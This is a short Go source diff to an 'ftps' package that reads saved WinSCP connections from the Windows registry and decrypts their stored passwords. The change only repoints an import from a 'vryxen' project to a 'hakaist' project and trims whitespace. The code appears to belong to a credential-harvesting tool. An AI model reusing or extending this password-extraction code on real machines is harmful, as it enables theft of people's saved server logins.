@@ -1,7 +1,6 @@
 package ftps
 
 import (
-	"github.com/unf6/vryxen/pkg/utils/requests"
 	"encoding/base64"
 	"encoding/xml"
 	"fmt"
@@ -9,6 +8,8 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
+
+	"github.com/lukyydnv/hakaist/pkg/utils/requests"
 
 	"golang.org/x/sys/windows/registry"
 )
@@ -43,7 +44,7 @@ func (w *WinSCP) ParseConnections() []LoginPair {
 	if err != nil {
 		if err == registry.ErrNotExist {
 			return loginPairs
-		}	
+		}
 		fmt.Println("Error opening registry key:", err)
 		return loginPairs
 	}
@@ -111,7 +112,7 @@ func decryptPasswordWinSCP(user, pass, host string) string {
 	}
 
 	if decodeNextChar(&digits) == 255 {
-		decodeNextChar(&digits) 
+		decodeNextChar(&digits)
 	}
 
 	if len(digits) >= 4 {
